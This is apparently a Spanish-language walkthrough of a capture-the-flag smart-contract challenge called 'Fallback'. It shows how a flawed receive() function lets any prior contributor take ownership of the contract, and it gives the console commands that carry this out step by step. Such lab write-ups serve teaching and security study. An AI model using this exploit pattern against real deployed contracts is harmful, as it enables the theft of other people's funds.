# La importancia de una función fallback segura
Este contrato cuenta con un mecanismo de contribuciones y una función fallback que se ejecuta cuando el contrato recibe fondos sin haber pasado por una función del propio contrato.

El constructor establece una contribución de 1000 ETH para el propietario, y para clasificar como contribución, se debe enviar una cantidad menor de 0.001 ETH.
Tenemos que aprovechar esta función fallback para llegar a owner y poder retirar todos los fondos del contrato.

El objetivo del jugador es aprovechar esta función fallback para transferir ETH desde el contrato a su cuenta.
```solidity
contract Fallback {
...
  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }
  ...
  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
 ...
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
- Contrato Original: [Fallback](Fallback.sol)

---
## Conceptos
- La función fallback: En Solidity es una función especial que se ejecuta automáticamente cuando se envía una transacción a un contrato sin especificar una función en particular.
- Wei: Es la unidad más pequeña de Ethereum y representa la cantidad mínima divisible de ether.
---
### Conseguir el owner del contrato
Hay 2 formas de llegar al owner.

- (EXPECTED) Teniendo más contribuciones que el actual owner (1000 ETH) que se asignó en el constructor.

Tendremos que tener mas de 1000 ETH de contribuciones y por cada contribucion como maximo podemos enviar 0.001 ETH para llegar a superar al owner. (No merece la pena por la cantidad excesiva de transacciones)
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```

- (UNEXPECTED) Aprovechandonos de la funcion fallback vulnerable a escalar a owner
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
---

### Como ejecutamos la funcion fallback "receive()"?
Requisitos:
- El valor que se envie al contrato sea mayor a 0
- Las contribuciones del que cae en la funcion sea mayor a 0
```solidity
 require(msg.value > 0 && contributions[msg.sender] > 0);
 ```

Checkeamos cuantas contribuciones tenemos:
```js
-> await contract.getContribution().then(cantidad => fromWei(cantidad.toString()))
<- '0'
```

Para conseguir contribuciones tenemos que enviar MENOS de 0.001 ETH usando la funcion contribute()
```solidity
require(msg.value < 0.001 ether);
contributions[msg.sender] += msg.value;
```

1- Enviamos 0.0009 ETH que es menos de 0.001 ETH que es el maximo para realizar una contribucion.
```js
-> await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
<- {tx: '0xtx', receipt:...}
```
2- Comprobamos que hemos hecho una contribucion
```js
-> await contract.getContribution().then(cantidad => fromWei(cantidad.toString()))
<- '0.0009'
```

Ya tenemos el requisito de tener contribuciones mayor a 0 para que la funcion fallback se ejecute.
Para que se ejecute receive tenemos que enviar algo de ETH al contrato

```js
-> await sendTransaction({from: player, to: contract.address, value: toWei('0.0000001')})
<- '0xtx...'
```

Ya somos el owner dado a que hemos complido los requisitos de la funcion receive para que el valor owner sea el msg.sender.

```js
-> await contract.owner()
<- '0xnuestrawallet'
```
